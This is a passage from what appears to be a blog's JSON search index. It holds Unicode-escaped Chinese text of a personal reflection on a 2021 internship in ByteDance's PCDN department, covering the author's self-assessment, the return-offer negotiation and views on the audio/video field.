97d\u5730\u5b8c\u6210\u6211\u7684\u4efb\u52a1\uff1b\u4f46\u662f\u7ed9\u81ea\u6211\u53d1\u5c55\uff08\u6216\u5b66\u5230\u7684\u4e1c\u897f\uff09\u6253\u5206\u7684\u8bdd\uff0c\u6700\u591a\u53ea\u80fd\u7b976\u5206\u5427\uff0c\u4e3b\u8981\u56e0\u4e3a\u5728\u5b9e\u4e60\u7684\u65f6\u5019\u4e3b\u8981\u662f\u6253\u6742\uff0c\u6ca1\u6709\u63d0\u70bc\u51fa\u4e00\u4e9b\u5c5e\u4e8e\u81ea\u5df1\u7684\u4e1c\u897f\u3002\u8fd9\u91cc\u4e3b\u8981\u8bb2\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u7ed9\u81ea\u6211\u53d1\u5c55\u62536\u5206\u5427\u3002 \u603b\u7ed3 \u00b6 \u5f53\u65f6\u53bb\u5b9e\u4e60\uff0c\u4e3b\u8981\u662f\u60f3\u7740\u80fd\u4e30\u5bcc\u5956\u52b1\uff0c\u7136\u540e\u518d\u79cb\u62db\u7684\u65f6\u5019\u6536\u5272offer\uff0c\u6216\u8005\u80fdsp\u8f6c\u6b63\uff0c\u4f46\u4e8b\u4e0e\u613f\u8fdd\u3002\u79cb\u62db\u9762\u8bd5\u7684\u65f6\u5019\uff0c\u9762\u8bd5\u5b98\u95ee\u6211\u5b9e\u4e60\u4e3b\u8981\u5e72\u4ec0\u4e48\u7684\u7684\u65f6\u5019\uff0c\u6211\u90fd\u4e0d\u77e5\u9053\u5982\u4f55\u56de\u7b54\uff0c\u6bd5\u7adf\u90fd\u662f\u6253\u6742\uff0c\u53ea\u80fd\u626f\u4e00\u4e0b\u90e8\u95e8\u4e1a\u52a1\u4e4b\u7c7b\u7684\u3002\u867d\u7136\u5927\u90e8\u5206\u7684\u5b9e\u4e60\u751f\u90fd\u662f\u6253\u6742\uff0c\u5f53\u65f6pcdn\u4f5c\u4e3a\u6bd4\u8f83\u6210\u719f\u7684\u4ea7\u54c1\uff0c\u90e8\u95e8\u8fd8\u662f\u6c89\u6dc0\u4e86\u4e0d\u5c11\u4e1c\u897f\u7684\uff0c\u5982\u679c\u5f53\u65f6\u80fd\u591a\u95ee\u522b\u4eba\u3001\u591a\u5438\u6536\u4e00\u70b9\uff0c\u53ef\u80fd\u4f1a\u66f4\u597d\u3002\u7531\u4e8e\u786e\u5b9e\u6ca1\u6709\u592a\u9ad8\u6c34\u5e73\uff0c\u5728\u8f6c\u6b63\u7b54\u8fa9\u7684\u65f6\u5019\uff0c\u4e5f\u6ca1\u6709\u62ff\u5230sp\uff0c\u8fd8\u662f\u901a\u8fc7\u534e\u4e3a\u7684offer\u6765argue\u624d\u52c9\u5f3a\u52a0\u4e86\u4e00\u70b9base\u3002\u867d\u7136\u5b9e\u4e60\u4e86\u597d\u51e0\u4e2a\u6708\uff0c\u4f46\u662f\u8bf4\u5b9e\u8bdd\uff0c\u76f4\u5230\u73b0\u5728\uff0c\u6211\u5bf9\u6240\u5728\u7684\u8d5b\u9053\u53d1\u5c55\u5982\u4f55\u90fd\u4e0d\u662f\u5f88\u4e86\u89e3\u3002 \u8fd9\u91cc\u53c8\u8bf4\u9053\u53e6\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u4e5f\u662f\u6211\u5728\u4eca\u5929\u7684\u5206\u4eab\u4f1a\u5b66\u5230\u7684\u3002\u9762\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u9762\u8bd5\u5b98\u57fa\u672c\u90fd\u8bf4\u5f88\u6709\u53d1\u5c55\u524d\u666f\u3002\u6b63\u5982\u5e08\u5144\u6240\u8bf4\uff0c\u8fd9\u9700\u8981\u8fa9\u8bc1\u5206\u6790\uff0c\u4e00\u79cd\u53ef\u80fd\u662f\u90e8\u95e8\u57fa\u7840\u8bbe\u65bd\u4e0d\u5b8c\u5584\uff08\u4ee3\u7801\u3001\u65b9\u6848\u7b49\u7b49\uff09\uff0c\u867d\u7136\u5b8f\u89c2\u6765\u770b\uff0c\u90e8\u95e8\u786e\u5b9e\u4f1a\u53d1\u5c55\u5730\u5f88\u5feb\uff08\u9ad8\u901f\u53d1\u5c55\u671f\uff09\uff0c\u4f46\u662f\u65b0\u4eba\u8fdb\u53bb\u611f\u89c9\u90fd\u662f\u6253\u6742\uff0c\u5f88\u96be\u6c89\u6dc0\u51fa\u5c5e\u4e8e\u81ea\u5df1\u7684\u4e1c\u897f\uff1b\u8fd8\u6709\u5c31\u662f\u90e8\u95e8\u4e1a\u52a1\u6bd4\u8f83\u6210\u719f\uff0c\u4f46\u662f\u53d1\u5c55\u76f8\u5bf9\u6765\u6c34\u6bd4\u8f83\u7f13\u6162\uff08\u4f53\u91cf\u5df2\u7ecf\u6bd4\u8f83\u5927\uff0c\u5904\u4e8e\u7f13\u6162\u589e\u957f\uff09\uff0c\u4f46\u662f\u8fd9\u79cd\u90e8\u95e8\u4e00\u822c\u90fd\u6709\u6bd4\u8f83\u6210\u719f\u7684\u65b9\u6848\u53ef\u4ee5\u4f9b\u65b0\u4eba\u5b66\u4e60\uff0c\u76f8\u5bf9\u6765\u6bd4\u8f83\u5229\u597d\u65b0\u4eba\u3002\u800cpcdn\uff0c\u6211\u4e2a\u4eba\u611f\u89c9\u662f\u5c5e\u4e8e\u4e24\u8005\u4e4b\u95f4\u7684\uff0c\u53ef\u80fd\u66f4\u503e\u5411\u4e8e\u524d\u8005\uff0c\u6bd5\u7adf\u5904\u4e8e\u521b\u4e1a\u9636\u6bb5\uff0c\u627f\u62c5\u7684\u6d41\u91cf\u6bd4\u8f83\u5c0f\u3002\u597d\u5728\u56e2\u961f\u5185\u7684\u65b9\u6848\u6bd4\u8f83\u6210\u719f\uff0c\u5927\u65b9\u5411\u6ca1\u95ee\u9898\uff0c\u6bd5\u7adf\u5df2\u7ecf\u8fc7\u4e86\u6bd4\u8f83\u5173\u952e\u7684\u8282\u70b9\uff0c\u4f8b\u5982\u901a\u8fc7\u5b9e\u9a8c\uff0c\u53ef\u4ee5\u4e0a\u7ebf\uff0c\u4f46\u76ee\u524d\u9700\u8981\u89e3\u51b3\u4e00\u4e9b\u5c0f\u95ee\u9898\uff08\u867d\u7136\u6709\u53ef\u80fd\u6f14\u53d8\u6210\u5927\u95ee\u9898\uff09\u3002\u5e0c\u671b\u8fd9\u4e2a\u8d5b\u9053\u5bf9\u4e2a\u4eba\u53d1\u5c55\u6bd4\u8f83\u597d\u5427\u3002 \u7136\u540e\u8bf4\u4e00\u4e0bpcdn\u8fd9\u6761\u8d5b\u9053\uff0c\u6216\u8005\u8bf4\u97f3\u89c6\u9891\u8fd9\u4e2a\u65b9\u5411\u3002\u6211\u611f\u89c9\u53d1\u5c55\u524d\u666f\u8fd8\u662f\u6bd4\u8f83\u4e0d\u9519\u7684\uff0c\u4f46\u662fpcdn\u5904\u4e8e\u97f3\u89c6\u9891\u7684\u4f20\u8f93\u65b9\u5411\uff0c\u5bf9\u97f3\u89c6\u9891\u4e2d\u66f4\u91cd\u8981\u7684\u9886\u57df\uff0c\u5982\u7f16\u89e3\u7801\u6d89\u53ca\u5f97\u5c31\u6bd4\u8f83\u5c11\u3002 \u5de5\u4f5c\u8fc7\u7a0b\u4e2d\u6700\u91cd\u8981\u7684\u662f\u4e2a\u4eba\u7684\u79ef\u7d2f\uff0c\u7136\u540e\u8fd9\u6bb5\u7ecf\u5386\u5bf9\u4ee5\u540e\u8df3\u69fd\u3001\u521b\u4e1a\u3001\u8f6c\u578b\u7b49\u804c\u4e1a\u53d1\u5c55\u624d\u662f\u6709\u5e2e\u52a9\u7684\u3002","title":"\u5b9e\u4e60\u603b\u7ed3"},{"location":"others/2022_03_13_internship/#_1","text":"\u867d\u7136\u4eca\u5929\u5df2\u7ecf\u79bb\u6211\u7ed3\u675f\u5728\u5b57\u8282\u7684\u5b9e\u4e60\uff082021.11\u6708\u5e95\u79bb\u804c\uff09\u90fd\u5feb4\u4e2a\u6708\u4e86\uff0c\u4f46\u8fd8\u662f\u60f3\u5199\u4e00\u4e0b\u603b\u7ed3\u3002\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u7a81\u7136\u60f3\u5199\u8fd9\u4e2a\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u4eca\u5929\u542c\u4e86\u4e00\u4e2a\u5b66\u957f\u7684\u5206\u4eab\uff0c\u53d1\u73b0\u4ed6\u5728\u5b9e\u4e60\u7684\u65f6\u5019\u5b66\u4e86\u597d\u591a\u4e1c\u897f\uff0c\u5bf9\u804c\u4e1a\u53d1\u5c55\u7b49\u90fd\u6709\u4e86\u4e00\u4e2a\u5f88\u6e05\u6670\u7684\u8ba4\u8bc6\uff0c\u800c\u6211\u5b9e\u4e60\u4e4b\u540e\u8fd8\u662f\u4e2afw\uff0c\u6240\u4ee5\u6211\u51b3\u5b9a\u5148\u4ece\u5199\u603b\u7ed3\u5f00\u59cb\uff0c\u53cd\u601d\u4e00\u4e0b\u81ea\u5df1\u4e4b\u524d\u5b58\u5728\u7684\u4e0d\u8db3\uff0c\u5e76\u4e14\u5b66\u4e60\u4e00\u4e0b\u4f18\u79c0\u7684\u4eba\u7684\u601d\u8003\u65b9\u5f0f\u3002 \u5176\u5b9e\u66f4\u91cd\u8981\u7684\u662f\u4e0d\u60f3\u5199\u6bd5\u8bbe\u4e86","title":"\u5b9e\u4e60\u603b\u7ed3"},{"location":"others/2022_03_13_internship/#_2","text":"\u4ece2021.7.9\u65e5\u5f00\u59cb\uff0c\u8fdb\u5165\u5b57\u8282pcdn\u90e8\u95e8\u5b9e\u4e60\uff0c\u52302021.11\u6708\u5e95\u79bb\u804c\uff0c\u5927\u6982\u5b9e\u4e60\u4e865\u4e2a\u6708\uff0c\u6700\u540e\u4e5f\u62ff\u5230\u4e86\u8f6c\u6b63offer\uff0c\u867d\u7136\u4e0d\u662f\u5927sp\uff0c\u4f46\u4e5f\u8fd8\u597d\uff08\u6bd5\u7adf\u6ca1\u5f97\u9009\u4e86\uff09\u3002\u5b9e\u4e60\u7684\u65f6\u5019\u4e3b\u8981\u662f\u6253\u6742\uff0c\u5404\u79cd\u6253\u6742\u3002\u5982\u679c\u5bf9\u8fd9\u6bb5\u5b9e\u4e60\u7ecf\u5386\u6253\u5206\u7684\u8bdd\uff0c\u6211\u81ea\u8ba4\u4e3a\u53ef\u4ee5\u7ed9\u5b9e\u4e60\u7684\u5de5\u4f5c\u62538\u5206\uff0c\u56e0\u4e3a\u6211\u90fd\u53ef\u4ee5\u6bd4\u8f83\u597d\u5730\u5b8c\u6210\u6211\u7684\u4efb\u52a1\uff1b\u4f46\u662f\u7ed9\u81ea\u6211\u53d1\u5c55\uff08\u6216\u5b66\u5230\u7684\u4e1c\u897f\uff09\u6253\u5206\u7684\u8bdd\uff0c\u6700\u591a\u53ea\u80fd\u7b976\u5206\u5427\uff0c\u4e3b\u8981\u56e0\u4e3a\u5728\u5b9e\u4e60\u7684\u65f6\u5019\u4e3b\u8981\u662f\u6253\u6742\uff0c\u6ca1\u6709\u63d0\u70bc\u51fa\u4e00\u4e9b\u5c5e\u4e8e\u81ea\u5df1\u7684\u4e1c\u897f\u3002\u8fd9\u91cc\u4e3b\u8981\u8bb2\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u7ed9\u81ea\u6211\u53d1\u5c55\u62536\u5206\u5427\u3002","title":"\u5b9e\u4e60\u7ecf\u5386"},{"location":"others/2022_03_13_internship/#_3","text":"\u5f53\u65f6\u53bb\u5b9e\u4e60\uff0c\u4e3b\u8981\u662f\u60f3\u7740\u80fd\u4e30\u5bcc\u5956\u52b1\uff0c\u7136\u540e\u518d\u79cb\u62db\u7684\u65f6\u5019\u6536\u5272offer\uff0c\u6216\u8005\u80fdsp\u8f6c\u6b63\uff0c\u4f46\u4e8b\u4e0e\u613f\u8fdd\u3002\u79cb\u62db\u9762\u8bd5\u7684\u65f6\u5019\uff0c\u9762\u8bd5\u5b98\u95ee\u6211\u5b9e\u4e60\u4e3b\u8981\u5e72\u4ec0\u4e48\u7684\u7684\u65f6\u5019\uff0c\u6211\u90fd\u4e0d\u77e5\u9053\u5982\u4f55\u56de\u7b54\uff0c\u6bd5\u7adf\u90fd\u662f\u6253\u6742\uff0c\u53ea\u80fd\u626f\u4e00\u4e0b\u90e8\u95e8\u4e1a\u52a1\u4e4b\u7c7b\u7684\u3002\u867d\u7136\u5927\u90e8\u5206\u7684\u5b9e\u4e60\u751f\u90fd\u662f\u6253\u6742\uff0c\u5f53\u65f6pcdn\u4f5c\u4e3a\u6bd4\u8f83\u6210\u719f\u7684\u4ea7\u54c1\uff0c\u90e8\u95e8\u8fd8\u662f\u6c89\u6dc0\u4e86\u4e0d\u5c11\u4e1c\u897f\u7684\uff0c\u5982\u679c\u5f53\u65f6\u80fd\u591a\u95ee\u522b\u4eba\u3001\u591a\u5438\u6536\u4e00\u70b9\uff0c\u53ef\u80fd\u4f1a\u66f4\u597d\u3002\u7531\u4e8e\u786e\u5b9e\u6ca1\u6709\u592a\u9ad8\u6c34\u5e73\uff0c\u5728\u8f6c\u6b63\u7b54\u8fa9\u7684\u65f6\u5019\uff0c\u4e5f\u6ca1\u6709\u62ff\u5230sp\uff0c\u8fd8\u662f\u901a\u8fc7\u534e\u4e3a\u7684offer\u6765argue\u624d\u52c9\u5f3a\u52a0\u4e86\u4e00\u70b9base\u3002\u867d\u7136\u5b9e\u4e60\u4e86\u597d\u51e0\u4e2a\u6708\uff0c\u4f46\u662f\u8bf4\u5b9e\u8bdd\uff0c\u76f4\u5230\u73b0\u5728\uff0c\u6211\u5bf9\u6240\u5728\u7684\u8d5b\u9053\u53d1\u5c55\u5982\u4f55\u90fd\u4e0d\u662f\u5f88\u4e86\u89e3\u3002 \u8fd9\u91cc\u53c8\u8bf4\u9053\u53e6\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u4e5f\u662f\u6211\u5728\u4eca\u5929\u7684\u5206\u4eab\u4f1a\u5b66\u5230\u7684\u3002\u9762\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u9762\u8bd5\u5b98\u57fa\u672c\u90fd\u8bf4\u5f88\u6709\u53d1\u5c55\u524d\u666f\u3002\u6b63\u5982\u5e08\u5144\u6240\u8bf4\uff0c\u8fd9\u9700\u8981\u8fa9\u8bc1\u5206\u6790\uff0c\u4e00\u79cd\u53ef\u80fd\u662f\u90e8\u95e8\u57fa\u7840\u8bbe\u65bd\u4e0d\u5b8c\u5584\uff08\u4ee3\u7801\u3001\u65b9\u6848\u7b49\u7b49\uff09\uff0c\u867d\u7136\u5b8f\u89c2\u6765\u770b\uff0c\u90e8\u95e8\u786e\u5b9e\u4f1a\u53d1\u5c55\u5730\u5f88\u5feb\uff08\u9ad8\u901f\u53d1\u5c55\u671f\uff09\uff0c\u4f46\u662f\u65b0\u4eba\u8fdb\u53bb\u611f\u89c9\u90fd\u662f\u6253\u6742\uff0c\u5f88\u96be\u6c89\u6dc0\u51fa\u5c5e\u4e8e\u81ea\u5df1\u7684\u4e1c\u897f\uff1b\u8fd8\u6709\u5c31\u662f\u90e8\u95e8\u4e1a\u52a1\u6bd4\u8f83\u6210\u719f\uff0c\u4f46\u662f\u53d1\u5c55\u76f8\u5bf9\u6765\u6c34\u6bd4\u8f83\u7f13\u6162\uff08\u4f53\u91cf\u5df2\u7ecf\u6bd4\u8f83\u5927\uff0c\u5904\u4e8e\u7f13\u6162\u589e\u957f\uff09\uff0c\u4f46\u662f\u8fd9\u79cd\u90e8\u95e8\u4e00\u822c\u90fd\u6709\u6bd4\u8f83\u6210\u719f\u7684\u65b9\u6848\u53ef\u4ee5\u4f9b\u65b0\u4eba\u5b66\u4e60\uff0c\u76f8\u5bf9\u6765\u6bd4\u8f83\u5229\u597d\u65b0\u4eba\u3002\u800cpcdn\uff0c\u6211\u4e2a\u4eba\u611f\u89c9\u662f\u5c5e\u4e8e\u4e24\u8005\u4e4b\u95f4\u7684\uff0c\u53ef\u80fd\u66f4\u503e\u5411\u4e8e\u524d\u8005\uff0c\u6bd5\u7adf\u5904\u4e8e\u521b\u4e1a\u9636\u6bb5\uff0c\u627f\u62c5\u7684\u6d41\u91cf\u6bd4\u8f83\u5c0f\u3002\u597d\u5728\u56e2\u961f\u5185\u7684\u65b9\u6848\u6bd4\u8f83\u6210\u719f\uff0c\u5927\u65b9\u5411\u6ca1\u95ee\u9898\uff0c\u6bd5\u7adf\u5df2\u7ecf\u8fc7\u4e86\u6bd4\u8f83\u5173\u952e\u7684\u8282\u70b9\uff0c\u4f8b\u5982\u901a\u8fc7\u5b9e\u9a8c\uff0c\u53ef\u4ee5\u4e0a\u7ebf\uff0c\u4f46\u76ee\u524d\u9700\u8981\u89e3\u51b3\u4e00\u4e9b\u5c0f\u95ee\u9898\uff08\u867d\u7136\u6709\u53ef\u80fd\u6f14\u53d8\u6210\u5927\u95ee\u9898\uff09\u3002\u5e0c\u671b\u8fd9\u4e2a\u8d5b\u9053\u5bf9\u4e2a\u4eba\u53d1\u5c55\u6bd4\u8f83\u597d\u5427\u3002 \u7136\u540e\u8bf4\u4e00\u4e0bpcdn\u8fd9\u6761\u8d5b\u9053\uff0c\u6216\u8005\u8bf4\u97f3\u89c6\u9891\u8fd9\u4e2a\u65b9\u5411\u3002\u6211\u611f\u89c9\u53d1\u5c55\u524d\u666f\u8fd8\u662f\u6bd4\u8f83\u4e0d\u9519\u7684\uff0c\u4f46\u662fpcdn\u5904\u4e8e\u97f3\u89c6\u9891\u7684\u4f20\u8f93\u65b9\u5411\uff0c\u5bf9\u97f3\u89c6\u9891\u4e2d\u66f4\u91cd\u8981\u7684\u9886\u57df\uff0c\u5982\u7f16\u89e3\u7801\u6d89\u53ca\u5f97\u5c31\u6bd4\u8f83\u5c11\u3002 \u5de5\u4f5c\u8fc7\u7a0b\u4e2d\u6700\u91cd\u8981\u7684\u662f\u4e2a\u4eba\u7684\u79ef\u7d2f\uff0c\u7136\u540e\u8fd9\u6bb5\u7ecf\u5386\u5bf9\u4ee5\u540e\u8df3\u69fd\u3001\u521b\u4e1a\u3001\u8f6c\u578b\u7b49\u804c\u4e1a\u53d1\u5c55\u624d\u662f\u6709\u5e2e\u52a9\u7684\u3002","title":"\u603b\u7ed3"}]}